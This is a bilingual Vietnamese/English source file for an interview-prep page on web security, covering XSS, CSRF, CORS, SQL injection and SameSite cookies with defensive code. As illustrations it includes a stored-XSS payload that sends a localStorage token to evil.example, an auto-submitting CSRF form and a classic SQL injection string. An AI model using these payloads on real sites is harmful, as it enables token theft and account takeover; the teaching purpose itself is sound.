import { Flow } from "@/components/Flow";
import type { InterviewData } from "@/components/InterviewList";
import type { Locale } from "@/lib/notebook";

const XSS = "https://owasp.org/www-community/attacks/xss/";
const XSS_CHEAT = "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html";
const CSP = "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP";
const CSRF = "https://owasp.org/www-community/attacks/csrf";
const CSRF_CHEAT = "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html";
const SAMESITE = "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value";
const CORS = "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS";
const SQLI = "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html";

export default function build(l: Locale): InterviewData {
  const t = (vi: string, en: string) => (l === "vi" ? vi : en);
  return {
    eyebrow: t("phỏng vấn · bảo mật web", "interview · web security"),
    title: t("Phỏng vấn bảo mật web: XSS, CSRF, CORS", "Web security interview: XSS, CSRF, CORS"),
    lede: t(
      "Bấm vào câu hỏi để xem đáp án, ví dụ và sơ đồ. Ví dụ quanh shop online (bình luận sản phẩm, đặt hàng, chuyển tiền); nguồn là OWASP và MDN.",
      "Click a question to see the answer, an example and a diagram. Examples revolve around the online shop (product reviews, orders, payments); sources are OWASP and MDN.",
    ),
    items: [
      {
        q: t("XSS là gì? Có mấy loại?", "What is XSS? What types are there?"),
        a: [
          t(
            "XSS (Cross-Site Scripting) là khi kẻ tấn công chèn được JavaScript của họ vào trang của bạn, và script đó chạy trong trình duyệt của người dùng khác với đầy đủ quyền của trang: đọc dữ liệu trên trang, gọi API thay người dùng, đánh cắp token trong localStorage, sửa giao diện để lừa nhập mật khẩu.",
            "XSS (Cross-Site Scripting) is when an attacker gets their JavaScript into your page, and it runs in other users' browsers with the page's full privileges: reading page data, calling APIs as the user, stealing tokens from localStorage, rewriting the UI to phish passwords.",
          ),
          t(
            "Stored XSS: script được lưu vào DB (bình luận sản phẩm, tên người dùng) rồi hiển thị cho mọi người xem, nguy hiểm nhất. Reflected XSS: script nằm trong URL hoặc form, server phản chiếu lại ngay vào trang (trang tìm kiếm in lại từ khoá), nạn nhân phải bấm vào link độc. DOM-based XSS: xảy ra hoàn toàn ở frontend, JS đọc dữ liệu (location.hash, query) rồi ghi vào DOM bằng innerHTML.",
            "Stored XSS: the script is saved in the DB (a product review, a username) and shown to everyone, the most dangerous. Reflected XSS: the script is in a URL or form and the server echoes it straight into the page (a search page printing the query); the victim must click a malicious link. DOM-based XSS: happens entirely in the frontend, JS reads data (location.hash, query) and writes it to the DOM with innerHTML.",
          ),
        ],
        diagram: <Flow id="secxss" label="Stored XSS" steps={[
          { title: t("Kẻ tấn công", "Attacker"), sub: t("đăng bình luận chứa <script>", "posts a review with <script>") },
          { title: "DB", sub: t("lưu nguyên văn", "stored as-is") },
          { title: t("Nạn nhân", "Victim"), sub: t("mở trang sản phẩm", "opens the product page"), hl: true },
          { title: t("Script chạy", "Script runs"), sub: t("với quyền của nạn nhân", "as the victim"), hl: true },
        ]} />,
        code: { lang: "html", src: `<!-- ${t("Bình luận độc được lưu vào DB", "Malicious review stored in the DB")} -->
<img src="x" onerror="fetch('https://evil.example/steal?t=' + localStorage.token)">

<!-- ${t("Server/frontend in thẳng ra trang không escape → script chạy ở mọi người xem", "Rendered without escaping → runs for everyone who views it")} -->` },
        href: XSS, label: "OWASP: Cross Site Scripting",
      },
      {
        q: t("Phòng chống XSS thế nào?", "How do you prevent XSS?"),
        a: [
          t(
            "1. Escape đầu ra theo đúng ngữ cảnh: chèn vào HTML thì đổi < > & \" ' thành entity. React, Vue, Angular tự escape khi render {text}, nên phần lớn đã an toàn. 2. Tránh các \"lối thoát\": innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval, href=\"javascript:...\". Bắt buộc phải render HTML người dùng (bài viết rich text) thì lọc bằng DOMPurify trước.",
            "1. Escape output for its context: when inserting into HTML, turn < > & \" ' into entities. React, Vue and Angular escape {text} automatically, so most code is already safe. 2. Avoid the \"escape hatches\": innerHTML, dangerouslySetInnerHTML, v-html, document.write, eval, href=\"javascript:...\". If you must render user HTML (rich text posts), sanitize it with DOMPurify first.",
          ),
          t(
            "3. CSP (Content-Security-Policy): header báo trình duyệt chỉ chạy script từ nguồn cho phép, chặn script inline; dù bị chèn được thẻ script thì cũng không chạy. 4. Cookie phiên/refresh token đặt HttpOnly để script không đọc được. 5. Validate đầu vào (độ dài, định dạng) như một lớp phụ, nhưng không thay được escape đầu ra.",
            "3. CSP (Content-Security-Policy): a header telling the browser to run scripts only from allowed sources and block inline scripts; even an injected script tag will not run. 4. Mark session/refresh-token cookies HttpOnly so scripts cannot read them. 5. Validate input (length, format) as an extra layer, but it never replaces output escaping.",
          ),
        ],
        code: [
          { lang: "tsx", src: `// ${t("An toàn: React tự escape", "Safe: React escapes automatically")}
<p>{review.content}</p>

// ${t("Nguy hiểm: chèn HTML thô", "Dangerous: raw HTML")}
<p dangerouslySetInnerHTML={{ __html: review.content }} />

// ${t("Nếu bắt buộc: lọc trước", "If you must: sanitize first")}
import DOMPurify from "dompurify";
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.content) }} />

// ${t("Cẩn thận link do người dùng nhập", "Beware of user-supplied links")}
const safe = /^https?:\\/\\//.test(url) ? url : "#";   // ${t("chặn javascript:", "blocks javascript:")}
<a href={safe}>{label}</a>` },
          { lang: "http", src: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'self'` },
        ],
        href: XSS_CHEAT, label: "OWASP: XSS prevention cheat sheet",
      },
      {
        q: t("CSRF là gì? Vì sao nó xảy ra?", "What is CSRF? Why does it happen?"),
        a: [
          t(
            "CSRF (Cross-Site Request Forgery, giả mạo request liên trang): kẻ tấn công lừa trình duyệt của nạn nhân (đang đăng nhập vào shop.com) gửi một request thay đổi dữ liệu tới shop.com, ví dụ đổi email, chuyển tiền, đặt hàng, mà nạn nhân không hề biết.",
            "CSRF (Cross-Site Request Forgery): an attacker tricks the browser of a victim (logged in to shop.com) into sending a state-changing request to shop.com, such as changing the email, transferring money or placing an order, without the victim knowing.",
          ),
          t(
            "Nguyên nhân: trình duyệt tự động gửi kèm cookie của shop.com với mọi request tới shop.com, kể cả khi request xuất phát từ trang evil.com (form tự submit, thẻ img). Server thấy cookie phiên hợp lệ nên tưởng là người dùng thật. Kẻ tấn công không đọc được phản hồi, nhưng không cần: hành động đã xảy ra.",
            "The cause: the browser automatically attaches shop.com's cookies to every request to shop.com, even when it starts from evil.com (an auto-submitting form, an img tag). The server sees a valid session cookie and assumes it is the real user. The attacker cannot read the response, but does not need to: the action already happened.",
          ),
          t(
            "Chỉ xảy ra khi xác thực bằng thứ trình duyệt tự gửi (cookie, HTTP Basic). API dùng header Authorization: Bearer do JS tự gắn thì không bị CSRF, vì trang khác không gắn được header đó (nhưng lại dễ bị XSS lấy token hơn).",
            "It only happens when auth relies on something the browser sends automatically (cookies, HTTP Basic). APIs using an Authorization: Bearer header added by JS are not vulnerable to CSRF, since another site cannot add that header (though the token is then more exposed to XSS).",
          ),
        ],
        diagram: <Flow id="seccsrf" label="CSRF" steps={[
          { title: t("Nạn nhân", "Victim"), sub: t("đang đăng nhập shop.com", "logged in to shop.com") },
          { title: "evil.com", sub: t("form ẩn tự submit", "hidden auto-submit form"), hl: true },
          { title: t("Trình duyệt", "Browser"), sub: t("tự gửi cookie shop.com", "attaches shop.com cookie") },
          { title: "shop.com", sub: t("tưởng là thật, chuyển tiền", "thinks it's real, transfers"), hl: true },
        ]} />,
        code: { lang: "html", src: `<!-- ${t("Trang evil.com", "Page on evil.com")} -->
<form action="https://shop.com/account/email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById("f").submit();</script>` },
        href: CSRF, label: "OWASP: CSRF",
      },
      {
        q: t("Phòng chống CSRF thế nào?", "How do you prevent CSRF?"),
        a: [
          t(
            "1. Cookie SameSite: Lax (mặc định ở trình duyệt hiện đại) không gửi cookie với POST từ trang khác; Strict không gửi với mọi request từ trang khác. Đây là lớp chặn chính hiện nay. 2. CSRF token: server sinh token ngẫu nhiên gắn với phiên, nhúng vào form hoặc trả cho SPA; mọi request thay đổi dữ liệu phải gửi kèm (trong field ẩn hoặc header X-CSRF-Token). Trang khác không đọc được token nên không giả được.",
            "1. SameSite cookies: Lax (the default in modern browsers) does not send cookies on cross-site POSTs; Strict sends none on any cross-site request. This is the main defense today. 2. CSRF tokens: the server generates a random per-session token, embeds it in forms or hands it to the SPA; every state-changing request must send it back (hidden field or X-CSRF-Token header). Other sites cannot read it, so they cannot forge it.",
          ),
          t(
            "3. Kiểm tra header Origin / Referer: chỉ chấp nhận request từ domain của mình. 4. Không dùng GET để thay đổi dữ liệu (GET phải an toàn, vì thẻ img hay link đều gọi được GET). 5. Thao tác nhạy cảm (đổi mật khẩu, chuyển tiền) bắt nhập lại mật khẩu hoặc OTP. Lưu ý: CORS không chống được CSRF, vì form submit không bị CORS chặn.",
            "3. Check the Origin / Referer header: accept only requests from your own domain. 4. Never use GET to change data (GET must be safe, since img tags and links can trigger it). 5. Sensitive actions (password change, transfers) require re-entering the password or an OTP. Note: CORS does not prevent CSRF, because form submissions are not blocked by CORS.",
          ),
        ],
        code: [
          { lang: "http", src: `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/` },
          { lang: "ts", src: `// ${t("SPA gửi CSRF token trong header", "The SPA sends the CSRF token in a header")}
await fetch("/account/email", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json", "X-CSRF-Token": csrfToken },
  body: JSON.stringify({ email }),
});

// ${t("Server: so khớp token với phiên", "Server: match the token to the session")}
if (req.get("X-CSRF-Token") !== req.session.csrfToken) return res.sendStatus(403);` },
        ],
        href: CSRF_CHEAT, label: "OWASP: CSRF prevention cheat sheet",
      },
      {
        q: t("XSS khác CSRF thế nào?", "XSS vs CSRF?"),
        a: t(
          "XSS: kẻ tấn công chạy được code NGAY TRONG trang của bạn, nên làm được mọi thứ người dùng làm được, đọc được dữ liệu và phản hồi; nguyên nhân là không escape dữ liệu. CSRF: kẻ tấn công ở trang KHÁC, chỉ lừa trình duyệt gửi request kèm cookie, không đọc được phản hồi, chỉ thực hiện được hành động \"mù\"; nguyên nhân là tin cookie tự gửi. XSS nguy hiểm hơn: có XSS thì mọi biện pháp chống CSRF (kể cả CSRF token) đều bị vượt qua, vì script đọc được token ngay trên trang.",
          "XSS: the attacker runs code INSIDE your page, so they can do anything the user can and read data and responses; the cause is missing escaping. CSRF: the attacker is on ANOTHER site and only tricks the browser into sending a request with cookies; they cannot read the response and can only perform \"blind\" actions; the cause is trusting automatically sent cookies. XSS is worse: with XSS, every CSRF defense (even CSRF tokens) is bypassed, because the script can read the token right on the page.",
        ),
        code: { lang: "markdown", src: t(
`|                        | XSS                              | CSRF                                 |
|------------------------|----------------------------------|--------------------------------------|
| Code độc chạy ở đâu    | trong trang của bạn              | ở trang khác (evil.com)              |
| Đọc được phản hồi      | có                               | không                                |
| Lợi dụng               | dữ liệu không được escape        | cookie tự gửi kèm                    |
| Phòng chống chính      | escape, DOMPurify, CSP           | SameSite, CSRF token, kiểm Origin    |
| Phía chịu trách nhiệm  | chủ yếu frontend + render server | chủ yếu backend (cookie, kiểm token) |`,
`|                        | XSS                              | CSRF                                 |
|------------------------|----------------------------------|--------------------------------------|
| Where bad code runs    | inside your page                 | on another site (evil.com)           |
| Can read responses     | yes                              | no                                   |
| Exploits               | unescaped data                   | automatically sent cookies           |
| Main defenses          | escaping, DOMPurify, CSP         | SameSite, CSRF tokens, Origin checks |
| Mostly owned by        | frontend + server rendering      | backend (cookies, token checks)      |`) },
        href: XSS_CHEAT, label: "OWASP: XSS prevention cheat sheet",
      },
      {
        q: t("CORS là gì? Preflight là gì?", "What is CORS? What is a preflight?"),
        a: [
          t(
            "Mặc định trình duyệt áp dụng Same-Origin Policy: JS ở app.shop.com không được ĐỌC phản hồi từ api.shop.com (khác origin = khác scheme, domain hoặc port). CORS (Cross-Origin Resource Sharing) là cơ chế để server nói \"cho phép origin này đọc\" qua header Access-Control-Allow-Origin.",
            "By default browsers enforce the Same-Origin Policy: JS on app.shop.com may not READ responses from api.shop.com (a different origin = different scheme, domain or port). CORS (Cross-Origin Resource Sharing) lets the server say \"this origin may read\" via the Access-Control-Allow-Origin header.",
          ),
          t(
            "Với request \"không đơn giản\" (method PUT/DELETE/PATCH, header tự đặt như Authorization, Content-Type: application/json), trình duyệt gửi trước một request OPTIONS gọi là preflight để hỏi server; server đồng ý thì mới gửi request thật. Muốn gửi cookie thì client đặt credentials: \"include\" và server phải trả Access-Control-Allow-Credentials: true kèm origin cụ thể, không được dùng *.",
            "For \"non-simple\" requests (PUT/DELETE/PATCH, custom headers like Authorization, Content-Type: application/json), the browser first sends an OPTIONS request, the preflight, to ask the server; only if allowed does it send the real request. To send cookies, the client sets credentials: \"include\" and the server must return Access-Control-Allow-Credentials: true with a specific origin, never *.",
          ),
          t(
            "Quan trọng: CORS là luật của TRÌNH DUYỆT để bảo vệ người dùng, không phải tường lửa của server. Postman, curl, server khác gọi thẳng API không bị CORS chặn. CORS chặn việc ĐỌC phản hồi, nhiều request vẫn tới được server, nên CORS không thay được xác thực và không chống được CSRF.",
            "Important: CORS is a BROWSER rule to protect users, not a server firewall. Postman, curl or another server calling the API directly are never blocked by CORS. CORS blocks READING the response; many requests still reach the server, so CORS does not replace authentication and does not stop CSRF.",
          ),
        ],
        diagram: <Flow id="seccors" label="CORS preflight" steps={[
          { title: "app.shop.com", sub: "fetch PUT /orders/1" },
          { title: "OPTIONS", sub: "preflight", hl: true },
          { title: "api.shop.com", sub: "Allow-Origin: app.shop.com" },
          { title: "PUT", sub: t("request thật", "real request"), hl: true },
        ]} />,
        code: [
          { lang: "http", src: `OPTIONS /orders/1 HTTP/1.1
Origin: https://app.shop.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.shop.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600` },
          { lang: "ts", src: `// NestJS
app.enableCors({
  origin: ["https://app.shop.com"],   // ${t("không dùng * khi có credentials", "never * with credentials")}
  credentials: true,
});` },
        ],
        href: CORS, label: "CORS (MDN)",
      },
      {
        q: t("Lỗi CORS ở frontend thì sửa ở đâu?", "A CORS error in the frontend: where do you fix it?"),
        a: t(
          "Sửa ở SERVER (thêm đúng header CORS cho origin của frontend), không sửa được ở frontend. Các cách \"chữa cháy\" như tắt bảo mật trình duyệt hay mode: \"no-cors\" không giải quyết gì (no-cors cho phản hồi rỗng, không đọc được). Khi dev local có thể dùng proxy của dev server (Vite, Next rewrites) để frontend và API cùng origin. Đọc kỹ thông báo lỗi: thiếu Allow-Origin, preflight bị 401/404 (server bắt xác thực cả OPTIONS), hoặc dùng * kèm credentials.",
          "Fix it on the SERVER (add the right CORS headers for the frontend's origin); the frontend cannot fix it. Hacks like disabling browser security or mode: \"no-cors\" solve nothing (no-cors gives an opaque, unreadable response). In local development, use the dev server's proxy (Vite, Next rewrites) so the frontend and API share an origin. Read the error carefully: a missing Allow-Origin, a preflight getting 401/404 (the server requires auth on OPTIONS too), or * used with credentials.",
        ),
        href: CORS, label: "CORS (MDN)",
      },
      {
        q: t("SQL injection là gì? Chống thế nào?", "What is SQL injection? How do you prevent it?"),
        a: t(
          "Khi ghép chuỗi dữ liệu người dùng vào câu SQL, kẻ tấn công nhập ký tự đặc biệt để đổi ý nghĩa câu lệnh: đăng nhập không cần mật khẩu, đọc bảng khác, xoá dữ liệu. Cách chống chính: luôn dùng parameterized query / prepared statement (hoặc ORM, query builder), dữ liệu được gửi tách riêng khỏi câu lệnh nên không bao giờ bị hiểu là SQL. Thêm: tài khoản DB quyền tối thiểu, whitelist cho tên cột khi sắp xếp động.",
          "When user data is concatenated into SQL, an attacker types special characters to change the statement: logging in without a password, reading other tables, deleting data. The main fix: always use parameterized queries / prepared statements (or an ORM / query builder), so data is sent separately and is never parsed as SQL. Also: a least-privilege DB account, and a whitelist for column names in dynamic sorting.",
        ),
        code: { lang: "ts", src: `// ${t("Sai: ghép chuỗi", "Bad: string concatenation")}
db.query(\`SELECT * FROM users WHERE email = '\${email}'\`);
// email = "' OR '1'='1"  →  ${t("trả về mọi user", "returns every user")}

// ${t("Đúng: tham số hoá", "Good: parameterized")}
db.query("SELECT * FROM users WHERE email = $1", [email]);` },
        href: SQLI, label: "OWASP: SQL injection prevention",
      },
      {
        q: t("SameSite Lax, Strict, None khác nhau?", "SameSite Lax vs Strict vs None?"),
        a: t(
          "Strict: không bao giờ gửi cookie khi request đến từ trang khác, kể cả bấm link từ email vào shop.com (người dùng sẽ thấy như chưa đăng nhập ở lần đầu). Lax (mặc định): gửi khi điều hướng cấp cao bằng GET (bấm link), không gửi với POST, fetch, iframe, img từ trang khác; cân bằng giữa an toàn và tiện. None: luôn gửi, bắt buộc kèm Secure; chỉ dùng khi thật sự cần cookie liên trang (widget nhúng, SSO) và phải có thêm CSRF token.",
          "Strict: never sends the cookie on requests from other sites, even clicking a link from an email to shop.com (the user looks logged out on that first visit). Lax (the default): sent on top-level GET navigations (clicking a link), not on cross-site POST, fetch, iframes or images; a balance of safety and convenience. None: always sent, and must be paired with Secure; use only when you truly need cross-site cookies (embedded widgets, SSO), and add CSRF tokens.",
        ),
        href: SAMESITE, label: "Set-Cookie SameSite (MDN)",
      },
    ],
  };
}
